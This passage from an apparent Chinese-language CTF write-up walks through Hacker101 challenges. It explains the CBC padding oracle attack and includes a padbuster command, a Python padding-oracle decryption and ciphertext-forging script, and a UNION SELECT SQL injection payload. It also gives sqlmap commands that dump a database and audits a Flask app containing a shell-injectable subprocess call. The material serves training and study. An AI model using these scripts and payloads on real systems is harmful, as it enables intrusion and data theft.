(OFB)）</li></ol></li><li><p>AES是加密算法，<strong>加密算法</strong>是通过接收方和发送方协商产生密钥，结合一系列的各种位运算之后得出的结果。而<strong>加密模式</strong>是在加密算法的基础上，把加密的方式变得更加复杂一点</p></li><li><p>CBC模式是一个链式结构<imgsrc="https://s2.loli.net/2023/07/26/7wOnDS9oQqWvE6G.jpg"alt="640" /></p><ol type="1"><li>在通过AES加密之前我们需要先将明文块0，也就是第一块明文，和我们的初始向量IV做异或操作，这个初始向量IV是随机的，而且长度是和我们的每一块明文块等长，因为要按位进行异或。这样无疑就在加密之前就已经先行打乱的我们的明文，与初始化向量异或后的明文，我们暂且称它为中间值，我们此时再对这个中间值进行AES加密，这样第一块明文的加密就完成了。</li><li>我们将第一块明文加密后的密文，作为第二个明文加密时的初始化向量，而这个就是这个链式结构的连接点，后续的步骤就是不断重复加密第一块明文时所做的操作，直至最后一块明文加密完成</li></ol><p>但是CBC这个模式在设计上存在缺陷，而这个<strong>缺陷</strong>就导致了著名的padding oracle攻击</p></li><li><p>用AES和DES两个加密算法来举例子AES的分组长度为每块16字节，DES呢则是每块8字节，那么怎么能保证我们的明文长度是<strong>16或者8的整数倍</strong>呢？</p><p>当然没办法保证，所以我们就要采取措施强制让明文为16或者8的整数倍，最直接的方法自然就是直接<strong>填充</strong>，不够就补到它够为止。这也就是所谓的padding填充。</p></li><li><p>剩余的几位当然不能随便填充，而要填充一些有价值的数值。</p></li><li><p>假如说此时我们按8字节为一个明文分组，分到最后发现最后一组缺了一个字节，程序不会填一些随机数，亦或者将不够的位数全填零。CBC模式最后的填充方法，就是缺了一位就填一个0x01,缺了两位就填两个0x02,缺了三位就填三个0x03,以此往后类推<strong>缺n个就填n个0x0n</strong>。哪怕当明文正好时分组的整数倍时，也会填充8个0x08，<strong>即使是整数倍也要填充</strong>。这样就导致了无论我们明文的长度是多少，我们CBC模式加密是都会在明文的最后进行填充，以确保分段的长度是8的整数倍。<imgsrc="https://s2.loli.net/2023/07/26/Y1GWSlLJVAytCTB.jpg"alt="640 (1)" /></p></li><li><p>而paddingoracle攻击，同样是通过<strong>服务端返回的信息的差异</strong>而产生的</p></li><li><p>目标：<strong>不知道密钥的情况下得到这段密文的明文</strong>，即我们是不知道中间值的</p></li><li><p>刚才的已知条件中，我提到了初始化向量必须已知才能进行攻击，那么这个初始化向量在哪呢？</p><p>一般是在密文的头部</p></li><li><p>初始化向量和密文的分组等长</p></li><li><p>加密流程<imgsrc="https://s2.loli.net/2023/07/26/TVhFmAYfnltqdzv.png"alt="640" /></p></li><li><p>解密流程<imgsrc="https://s2.loli.net/2023/07/27/PUxoRhG7SJb6AXt.png"alt="20181110151624" /></p></li><li><p>将初始化向量<strong>全部制为零</strong>,异或的结果是3D，此时我们是不可能知道这个异或出来的结果是3D的，但是此时服务端会报一个错，那就是填充位错误，为什么会报这个错，因为之前说了，填充文在8个字节为分组的情况下，最多只可能填到8个0x08，所以怎么可能会有0x3D呢？<imgsrc="https://s2.loli.net/2023/07/26/l7AyDSZnQrGubkm.png"alt="bea01e04-f419-4b48-927e-64a7e17d2502" /></p></li><li><p>如果此时异或出来的结果为“39732322076a2601”也就是异或出来的结果最后一位为<strong>0x01</strong>时就不会报填充位错误了。但是后续还会在爆一个错误，那就是业务判断你这个解密出来的明文数据也就是“39732322076a2601”不正确，因为我们初始化向量都制为零的，所以这个明文当然是错误的，<em>不过这都不重要</em>。<imgsrc="https://s2.loli.net/2023/07/26/1iKc5YqMw7BjnZp.png"alt="872ae514-4c57-46e6-828b-363d8da39896" /></p></li><li><p>我们就需要变化初始化向量的最后一个字节让其和中间值的最后一个字节异或的结果为0x01,所以此时我们需要用到穷举的方法，一个字节的范围为，<strong>0x00-0xFF</strong>,最多也就是需要尝试256次。</p><ol type="1"><li>明文和初始化向量枚举</li></ol></li><li><p><strong>关键</strong>：填充值是惟一的，只要填充不报错，那么此次必定是正确的填充</p></li><li><p><code>“q” xor “a” xor “q” == “a”</code></p></li><li><p>CBC字节翻转攻击</p><ol type="1"><li><code>X = “q” xor “a”</code></li><li><code>Y = “q” xor "a" xor " b"</code></li><li><code>Y xor q xor a = b</code></li></ol></li><li><p>padbuster</p></li></ol><h4 id="solution-flag2">Solution flag2</h4><ol type="1"><li><p>修改最后一个字节<imgsrc="https://s2.loli.net/2023/07/27/7XjAeVl8dcP2uIY.png"alt="image-20230727144943627" /></p></li><li><p>payload:</p><p>格式</p><pre class="language-bash" data-language="bash"><code class="language-bash">  Use: padbuster URL EncryptedSample BlockSize <span class="token punctuation">[</span>options<span class="token punctuation">]</span>   Where: URL <span class="token operator">=</span> The target URL <span class="token punctuation">(</span>and query string <span class="token keyword">if</span> applicable<span class="token punctuation">)</span>       EncryptedSample <span class="token operator">=</span> The encrypted value you want to test. Must                         also be present <span class="token keyword">in</span> the URL, PostData or a Cookie       BlockSize <span class="token operator">=</span> The block size being used by the algorithm</code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">padbuster https://b0863a464f1d26b6dc9084cdfd07a13c.ctf.hacker101.com/?post<span class="token operator">=</span>/O0WpF5q45idvmhStJIc82m+anmo8Df4GQYRfomHNUi8FTy7aFpdkZPwaelbBbLJAwfUe7QXZGSq7T1cOp1TMy0soO/MbSEKCJwZIE3YL8raADDo+gF9qvMfN9WARzKLzW19Z7iFAYDE7bjfVpudSgRx9r0W9Nm0iHhrtVqUzgDcR2N87CvehoNWzab1phjqc3ciCamuvIshBDyX6ScGsQ<span class="token operator">==</span> /O0WpF5q45idvmhStJIc82m+anmo8Df4GQYRfomHNUi8FTy7aFpdkZPwaelbBbLJAwfUe7QXZGSq7T1cOp1TMy0soO/MbSEKCJwZIE3YL8raADDo+gF9qvMfN9WARzKLzW19Z7iFAYDE7bjfVpudSgRx9r0W9Nm0iHhrtVqUzgDcR2N87CvehoNWzab1phjqc3ciCamuvIshBDyX6ScGsQ<span class="token operator">==</span> <span class="token number">16</span> <span class="token parameter variable">-encoding</span> <span class="token number">0</span></code></pre><p>解析：</p><p>用于<strong>对密文进行反向推理攻击</strong>，主要参数解析:</p><ul><li><p>padbuster: 表示使用padbuster工具进行padding oracleattack</p></li><li><p>https://b0863a464f1d26b6dc9084cdfd07a13c.ctf.hacker101.com:目标服务器地址</p></li><li><p>?post= : 发送的密文参数</p></li><li><p>/O0Wp...GsQ== : base64编码后的密文</p></li><li><p>/O0Wp...GsQ== : 重复一次密文,用于比较响应差异</p></li><li><p>16: 指定密文中最后一个字节位置为16</p></li><li><p>-encoding 0: 指定密文的编码方式为0</p></li></ul><p>攻击思路是:</p><ol type="1"><li><p>发送密文,并观察响应差异判断填充校验结果</p></li><li><p>修改密文的最后一个字节(16位置),再次发送,直到填充正确</p></li><li><p>重复此流程,可以逐字节反推出正确的明文</p></li><li><p>最终可以完全恢复明文信息</p></li></ol><p>这样通过分析密文和填充校验响应,不需要知道密钥就可以破译密文,达到攻击目的。</p></li><li><p>result<imgsrc="https://s2.loli.net/2023/07/27/YKuqDFd3LnSoUfs.png"alt="image-20230727140851144" /></p></li></ol><h4 id="flag3">flag3</h4><ul><li><p>异或运算的特点</p></li><li><p>使用padding oracle attack进行加密攻击,:</p><ol type="1"><li>目标是加密{"id": "1"},以查询id=1对应的信息。</li><li>利用密文分组链接的特点,当前密文块等于解密后的数据与前一块密文异或。</li><li>已知中间值和要加密的明文,可以构造出新的IV,再与原密文组合成新的密文。</li><li>发送新的密文到服务器,如果填充正确可以获得正确的响应。</li><li>这样不需要知道密钥就可以构造密文,绕过验证来获取信息。</li><li>手动计算或使用padbuster等工具可以自动完成这一攻击。</li></ol></li></ul><ol type="1"><li><p>脚本分析</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">trans</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"b'%s'"</span> <span class="token operator">%</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'\\x%.2x'</span> <span class="token operator">%</span> x <span class="token keyword">for</span> x <span class="token keyword">in</span> s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">,</span> <span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'!'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span> <span class="token string">'~'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'!'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">bxor</span><span class="token punctuation">(</span>b1<span class="token punctuation">,</span> b2<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># use xor for bytes</span>    result <span class="token operator">=</span> <span class="token string">b""</span>    <span class="token keyword">for</span> b1<span class="token punctuation">,</span> b2 <span class="token keyword">in</span> <span class="token builtin">zip</span><span class="token punctuation">(</span>b1<span class="token punctuation">,</span> b2<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>b1 <span class="token operator">^</span> b2<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">'?post=&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'PaddingException'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">def</span> <span class="token function">generate_iv_list</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">:</span>    iv <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span>iv<span class="token operator">+</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>change<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>tail <span class="token keyword">for</span> change <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xff</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">padding_oracle_decrypt</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'破解数据：&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    index <span class="token operator">=</span> <span class="token number">15</span>    intermediary <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    tail <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> index <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> iv <span class="token keyword">in</span> generate_iv_list<span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'尝试初始向量：&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>trans<span class="token punctuation">(</span>iv<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> test<span class="token punctuation">(</span>url<span class="token punctuation">,</span> encode<span class="token punctuation">(</span>iv<span class="token operator">+</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                intermediary <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">-</span>index<span class="token punctuation">)</span> <span class="token operator">^</span> iv<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> intermediary                index <span class="token operator">-=</span> <span class="token number">1</span>                tail <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>temp <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">-</span>index<span class="token punctuation">)</span> <span class="token keyword">for</span> temp <span class="token keyword">in</span> intermediary<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token keyword">break</span>    <span class="token keyword">return</span> intermediary<span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""按PKCS#5填充"""</span>    amount_to_pad <span class="token operator">=</span> block_size <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">%</span> block_size<span class="token punctuation">)</span>    <span class="token keyword">if</span> amount_to_pad <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        amount_to_pad <span class="token operator">=</span> block_size    pad <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>amount_to_pad<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> data <span class="token operator">+</span> pad <span class="token operator">*</span> <span class="token number">16</span><span class="token comment"># flag3</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    post <span class="token operator">=</span> <span class="token string">'riH5l9EATU!oPwV00CLdo5Hi7o68vN2PP8efbJDftZ6jyPdlCI9YHtriejKj!67Sz8EhJDaGQLQ9cNuVFDkCns3KM!JV5zAxDuCtsKkCqBh626bIwg55GnAJg46zVHWbBzcmmpoVN7X07yfKH!qX7qpJlGxEfarnbcPFxJYXEsFFy6!Zr-XPcAvDedzVIkrBGpE6Qv5sQcV71xMNinVJOQ~~'</span>    data <span class="token operator">=</span> decode<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token comment"># 抛弃原始密文的前5个分组（加1是因为有16字节的IV）</span>    iv_6 <span class="token operator">=</span> decode<span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token comment"># 第5个分组的密文，也就是第6个分组的“IV”</span>    immediate <span class="token operator">=</span> bxor<span class="token punctuation">(</span><span class="token string">b'$FLAG$", "id": "'</span><span class="token punctuation">,</span> iv_6<span class="token punctuation">)</span>    <span class="token comment"># 第6个分组密文解密的直接结果</span>    iv <span class="token operator">=</span> bxor<span class="token punctuation">(</span>immediate<span class="token punctuation">,</span> <span class="token string">b'&#123;"id":"1", "i":"'</span><span class="token punctuation">)</span>    <span class="token comment"># 计算出合适的IV</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>encode<span class="token punctuation">(</span>iv<span class="token operator">+</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># flag4</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span><span class="token comment">#     url = 'https://1dfea4f4a8b3089428676a397165677b.ctf.hacker101.com/'</span><span class="token comment">#     post = 'NGCdFZzHJDgS!!6el64!zRr8kaSlmR9l9VzNmbxcOJtuS8z4zg!eZfnyfH!6R6zQbS6MV2yWhS5Rc0-!IAvCpe-qaWoL6vl6C1s946NcFZpph2iiukyMli5v8!PPSfy2flCDoU!5hffPBUStLd14W29oupDklifEDEHE4NhbQm8XuEvelArs!x3UngdYBTOl312LTUX56w!7coteJTvBdw~~'</span><span class="token comment">#     ciphertext = decode(post)[16*6:16*7]</span><span class="token comment">#     immediate = bxor(b'$FLAG$", "id": "', decode(post)[16*(1+4):16*(1+5)])</span><span class="token comment">#     plains = '&#123;"id":"0 UNION SELECT group_concat(headers), \'\' from tracking","key":"XjPkmljch5E2sMiNhsNiqg~~"&#125;'</span><span class="token comment">#     data = pad(plains.encode('utf-8'), 16)</span><span class="token comment">#     block_amount = int(len(data) / 16)</span><span class="token comment">#     index = block_amount</span><span class="token comment">#     while True:</span><span class="token comment">#         block = data[(index-1)*16: index*16]</span><span class="token comment">#         print('处理块：')</span><span class="token comment">#         print(block)</span><span class="token comment">#         iv = bxor(immediate, block)</span><span class="token comment">#         ciphertext = iv + ciphertext</span><span class="token comment">#         index -= 1</span><span class="token comment">#         if index > 0:</span><span class="token comment">#             immediate = padding_oracle_decrypt(url, iv)</span><span class="token comment">#         else:</span><span class="token comment">#             break</span><span class="token comment">#     print(encode(ciphertext))</span></code></pre></li><li><p>将密文作为post参数，请求url</p></li></ol><h4 id="flag4sql注入">flag4:sql注入</h4><h3 id="photo-gallery">Photo Gallery</h3><h4 id="flag1">flag1</h4><ol type="1"><li><figure><img src="https://s2.loli.net/2023/08/01/cmWMJ2AUxeCBu9j.png"alt="image-20230801170332141" /><figcaption aria-hidden="true">image-20230801170332141</figcaption></figure></li><li><p>sql注入<imgsrc="https://s2.loli.net/2023/08/01/E697WQeRmoKaABV.png"alt="image-20230801170412633" /></p></li><li><p><strong>sqlmap</strong>:<ahref="https://www.anquanke.com/post/id/235846">用法</a></p><ol type="1"><li><p>数据库</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"https://be2349d065f4af4d08318ee8139911fb.ctf.hacker101.com/fetch?id=1"</span> <span class="token parameter variable">--dbs</span>   </code></pre></li><li><p>表</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"https://be2349d065f4af4d08318ee8139911fb.ctf.hacker101.com/fetch?id=1"</span> <span class="token parameter variable">-D</span> level5 <span class="token parameter variable">--tables</span></code></pre></li><li><p>该表所有内容</p><pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"https://be2349d065f4af4d08318ee8139911fb.ctf.hacker101.com/fetch?id=1"</span> <span class="token parameter variable">-D</span> level5 <span class="token parameter variable">-T</span> photos  <span class="token parameter variable">--dump</span> <span class="token parameter variable">--thread</span> <span class="token number">10</span></code></pre><figure><img src="https://s2.loli.net/2023/08/01/KRmLO2b9jzQ3w4P.png"alt="image-20230801170745456" /><figcaption aria-hidden="true">image-20230801170745456</figcaption></figure></li><li><p>id =3，flag关键组成</p></li></ol></li></ol><h4 id="flag2">flag2</h4><ol type="1"><li><p>uwsgi</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">.</span>├── app│   ├── app│   │   ├── api│   │   │   ├── api.py│   │   │   ├── endpoints│   │   │   │   ├── __init__.py│   │   │   │   └── user.py│   │   │   ├── __init__.py│   │   │   └── utils.py│   │   ├── core│   │   │   ├── app_setup.py│   │   │   ├── database.py│   │   │   └── __init__.py│   │   ├── __init__.py│   │   ├── main.py│   │   └── models│   │       ├── __init__.py│   │       └── user.py│   └── uwsgi.ini└── Dockerfile</code></pre></li><li><p>sql注入：<strong>id=4</strong><imgsrc="https://s2.loli.net/2023/08/01/SUOZcrCpRzH1yfm.png"alt="image-20230801172714234" /></p></li><li><p>继续注入<imgsrc="https://s2.loli.net/2023/08/01/WaugYR2foHw5MJD.png"alt="image-20230801172730939" /></p></li></ol><h4 id="flag-123">flag 1&amp;2&amp;3</h4><ol type="1"><li><p>对<code>main.py</code>代码审计</p><pre class="language-python" data-language="python"><code class="language-python"> <span class="token number">1</span> <span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response <span class="token number">2</span> <span class="token keyword">import</span> base64<span class="token punctuation">,</span> json<span class="token punctuation">,</span> MySQLdb<span class="token punctuation">,</span> os<span class="token punctuation">,</span> re<span class="token punctuation">,</span> subprocess <span class="token number">3</span>  <span class="token number">4</span> app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span> <span class="token number">5</span>  <span class="token number">6</span> home <span class="token operator">=</span> <span class="token triple-quoted-string string">''' 7 &lt;!doctype html> 8 &lt;html> 9     &lt;head>10         &lt;title>Magical Image Gallery&lt;/title>11     &lt;/head>12     &lt;body>13         &lt;h1>Magical Image Gallery&lt;/h1>14 $ALBUMS$15     &lt;/body>16 &lt;/html>17 '''</span><span class="token number">18</span> <span class="token number">19</span> viewAlbum <span class="token operator">=</span> <span class="token triple-quoted-string string">'''20 &lt;!doctype html>21 &lt;html>22     &lt;head>23         &lt;title>$TITLE$ -- Magical Image Gallery&lt;/title>24     &lt;/head>25     &lt;body>26         &lt;h1>$TITLE$&lt;/h1>27 $GALLERY$28     &lt;/body>29 &lt;/html>30 '''</span><span class="token number">31</span> <span class="token number">32</span> <span class="token keyword">def</span> <span class="token function">getDb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">33</span>     <span class="token keyword">return</span> MySQLdb<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"root"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">,</span> db<span class="token operator">=</span><span class="token string">"level5"</span><span class="token punctuation">)</span><span class="token number">34</span> <span class="token number">35</span> <span class="token keyword">def</span> <span class="token function">sanitize</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">36</span>     <span class="token keyword">return</span> data<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'&amp;quot;'</span><span class="token punctuation">)</span><span class="token number">37</span> <span class="token number">38</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token number">39</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">40</span>     <span class="token comment">#使用cursor()方法获取操作游标 </span><span class="token number">41</span>     cur <span class="token operator">=</span> getDb<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token number">42</span>     cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT id, title FROM albums'</span><span class="token punctuation">)</span><span class="token number">43</span>     <span class="token comment">#接收全部的返回结果行,放入列表albums。   [(id1,title1),(id2,title2),(id3,title3)]</span><span class="token number">44</span>     albums <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">45</span> <span class="token number">46</span>     rep <span class="token operator">=</span> <span class="token string">''</span><span class="token number">47</span>     <span class="token keyword">for</span> <span class="token builtin">id</span><span class="token punctuation">,</span> title <span class="token keyword">in</span> albums<span class="token punctuation">:</span><span class="token number">48</span>         rep <span class="token operator">+=</span> <span class="token string">'&lt;h2>%s&lt;/h2>n'</span> <span class="token operator">%</span> sanitize<span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token number">49</span>         rep <span class="token operator">+=</span> <span class="token string">'&lt;div>'</span><span class="token number">50</span>         cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">51</span>         fns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token number">52</span>         <span class="token comment">#遍历。 src="fetch?id=%i"  id取值于pid，pid与pfn(filename)想关联，并将pfn文件路径存入列表fns</span><span class="token number">53</span>         <span class="token keyword">for</span> pid<span class="token punctuation">,</span> ptitle<span class="token punctuation">,</span> pfn <span class="token keyword">in</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token number">54</span>             rep <span class="token operator">+=</span> <span class="token string">'&lt;div>&lt;img src="fetch?id=%i" width="266" height="150">&lt;br>%s&lt;/div>'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>pid<span class="token punctuation">,</span> sanitize<span class="token punctuation">(</span>ptitle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">55</span>             fns<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pfn<span class="token punctuation">)</span><span class="token number">56</span>         <span class="token comment">#subprocess.check_output函数可以执行一条shell命令，并返回命令的输出内容</span><span class="token number">57</span>         <span class="token comment">#du命令：查看文件夹和文件的磁盘占用情况     </span><span class="token number">58</span>         <span class="token comment"># || 符合：当前面执行出错时，执行后面的</span><span class="token number">59</span>         rep <span class="token operator">+=</span> <span class="token string">'&lt;i>Space used: '</span> <span class="token operator">+</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">'du -ch %s || exit 0'</span> <span class="token operator">%</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'files/'</span> <span class="token operator">+</span> fn <span class="token keyword">for</span> fn <span class="token keyword">in</span> fns<span class="token punctuation">)</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>STDOUT<span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'&lt;/i>'</span><span class="token number">60</span>         rep <span class="token operator">+=</span> <span class="token string">'&lt;/div>n'</span><span class="token number">61</span> <span class="token number">62</span>     <span class="token keyword">return</span> home<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'$ALBUMS$'</span><span class="token punctuation">,</span> rep<span class="token punctuation">)</span><span class="token number">63</span> <span class="token number">64</span> @app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token 